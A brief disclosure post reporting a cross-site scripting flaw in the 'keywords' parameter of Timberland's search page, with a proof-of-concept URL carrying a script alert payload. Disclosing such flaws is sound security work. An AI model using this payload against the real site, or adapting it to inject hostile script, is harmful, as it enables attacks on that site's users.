There's a vulnerability in Timberland's search engine.

The variable 'keywords' in searchHandler/index.jsp is not correctly sanitized.

URL:
hxxp://www.timberland.com/searchHandler/index.jsp?keywords=[XSS Code]

Example:
hxxp://www.timberland.com/searchHandler/index.jsp?keywords=<script>alert('test');</script>
